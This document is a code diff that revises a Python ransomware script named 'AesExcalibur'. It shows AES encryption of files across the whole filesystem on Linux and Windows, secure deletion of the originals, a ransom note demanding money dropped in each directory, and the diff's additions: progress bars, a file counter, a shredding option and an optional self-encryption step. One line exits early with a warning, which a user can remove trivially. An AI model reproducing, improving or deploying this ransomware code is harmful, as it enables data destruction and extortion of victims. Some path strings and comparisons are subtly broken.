@@ -30,11 +30,12 @@ except ImportError:
     raise ImportError("Python3.7 is required for usage")
 
 try:
+    from tqdm import tqdm
     from Crypto import Random
     from Crypto.Hash import SHA256
     from Crypto.Cipher import AES
-except (ImportError, ModuleNotFoundError) as hell:
-    raise hell("PyCryptodome dependency not satisfied. Install requirements.txt to continue")
+except ImportError:
+    raise ImportError("Dependencies not satisfied. Install requirements.txt to continue")
 
 # --------------------------------------------------------------------------
 
@@ -65,11 +66,11 @@ ascii_art = """
 
 
 # Note to leave in each path, edit this to fit your needs
-note = "Whoops! We're so sorry! Your files have been encrypted. And the only way to decrypt" \
+note = "Whoops! We're sorry! Your files have been encrypted. And the only way to decrypt" \
        " them is with the key. If you want the key, you must send us moneyz"
 
 
-# Pretty printing
+# Class for pretty printing
 class Colors:
     bold = "\033[1m"
     underline = "\033[4m"
@@ -102,10 +103,10 @@ target_extensions = [
 # --------------------------------------------------------------------------
 
 # Get the system's OS to determine pathing
-if sys.platform in ["linux", "darwin"]:
+if sys.platform.lower() in ["linux", "darwin"]:
     paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "/opt", "\var"  # "/usr"  #, "/root"
 
-elif sys.platform in ["win32", "win64", "Windows", "windows"]:
+elif sys.platform.lower() in ["win32", "win64", "windows", "nt"]:
     paths = "C:\\ ", "D:\\ ", "E:\\ ,""."
 
 else:
@@ -142,6 +143,10 @@ class AesExcalibur:
 
     def __init__(self, password):
         self.key = SHA256.new(password).digest()
+        self.total = 0  # Total amount of files modified
+
+    def __str__(self):
+        return "Total number of files modified: {}".format(self.total)
 
     @staticmethod
     def pad(message):
@@ -170,6 +175,7 @@ class AesExcalibur:
             with open(file_name + ".AeS", 'wb+') as f:
                 f.write(encrypted)
             secure_delete(file_name)  # Remove the original in a the same thread pool
+            self.total += 1
         except (IOError, ValueError, FileNotFoundError, Exception):
             pass  # Suppress output for progress bars
 
@@ -182,6 +188,7 @@ class AesExcalibur:
             with open(file_name[:-4], 'wb+') as f:
                 f.write(decrypted)
             secure_delete(file_name)
+            self.total += 1
         except (IOError, ValueError, FileNotFoundError) as err:
             print(Colors.red + "An error occured: {}".format(err))
 
@@ -193,13 +200,14 @@ class AesExcalibur:
 
 def parse_args(args):
     parser = argparse.ArgumentParser(description="Cross platform ransomeware module in python3.7")
-    parser.add_argument("-e", "--encrypt", action="store_true", default=False, help="Encrypt the entire filesystem",
-                        required=False)
+    parser.add_argument("-e", "--encrypt", action="store_true", default=False,
+                        help="Encrypt the entire filesystem", required=False)
 
-    parser.add_argument("-d", "--decrypt", action="store_true", default=False, help="Decrypt the entire filesystem",
-                        required=False)
+    parser.add_argument("-d", "--decrypt", action="store_true", default=False,
+                        help="Decrypt the entire filesystem", required=False)
 
     parser.add_argument("-s", "--secret", type=str, help="Password to use as key")
+    parser.add_argument("-p", "--passes", type=int, help="Number of passes for shredding file")
     return parser.parse_args(args)
 
 
@@ -263,25 +271,31 @@ def serve_payload(mode, password):
     with ThreadPoolExecutor(max_workers=25) as pool:  # Serve payload in with max 25 threads in the thread pool
         if mode is 1:
             print(Colors.white + "Encrypting system")
-            pool.map(sanctuary.encrypt_file, files)  # Begin applying encryption
+            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
+                                                  ascii=True, desc="Encryption status"))  # Begin applying encryption
+
             try:
                 for path in paths:
                     with open(path + "/L0VE_NOTE.txt", "w+") as f:
-                        # print(note, file=f)
                         f.write(note)
             except: pass
 
         elif mode is 2:  # Begin applying decryption
             print(Colors.white + "Decrypting system")
-            pool.map(sanctuary.decrypt_file, files)
+            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
+                                                  ascii=True, desc="Decryption status: "))
 
-    # Log output to a file for debug purposes
-    try:
-        with open("excalibur.log", "a+") as f:
-            f.write("Total runtime: {}\n".format(time() - start))
-    except: pass
+    # Print total
+    print(Colors.green + sanctuary.__str__())
+    print(Colors.green + "Total runtime: {}\n".format(time() - start))
 
-
+    # # Encrypt this file
+    answer = input("Encrypt this file? [y/n]")
+    if answer in ["y", "Y", "yes", "YES"]:
+        sanctuary.encrypt_file(os.path.abspath(__file__))
+        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
+    else:
+        pass
 # --------------------------------------------------------------------------
 
 
@@ -294,12 +308,11 @@ def main(args=None):
     os.system("clear" if "linux" in sys.platform else "cls")
     exit("THIS WILL HARM YOUR COMPUTER")
     print(Colors.blue + ascii_art)
-    print(Colors.underline + args)
 
     # If user entered any arguments, run them through parse_args()
     if args:
         args = parse_args(args)
-        print(args)
+        print(Colors.white + "Arguments entered: {}".format(args))
 
     # User didn't enter any args. Get input manually
     if not args:
@@ -325,6 +338,7 @@ def main(args=None):
         else:
             serve_payload(mode=1, password=args.secret)
 
+    # User chose decrypt system
     elif args.decrypt:
 
         # User entered some args but didn't enter a password variable
@@ -336,8 +350,7 @@ def main(args=None):
 
 
 if __name__ == '__main__':
-    main(sys.argv[1:])  # If this script is run directly, use sys.argv for input instead of argparse
-    # # Encrypt this file
-    # if input("Encrypt this file?"):
-    #     sanctuary.encrypt_file(os.path.abspath(__file__))
-    #     sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
+    # If this script is run directly, use sys.argv for input
+    # instead of argparse which allows the file to be used as a module
+    main(sys.argv[1:])
+
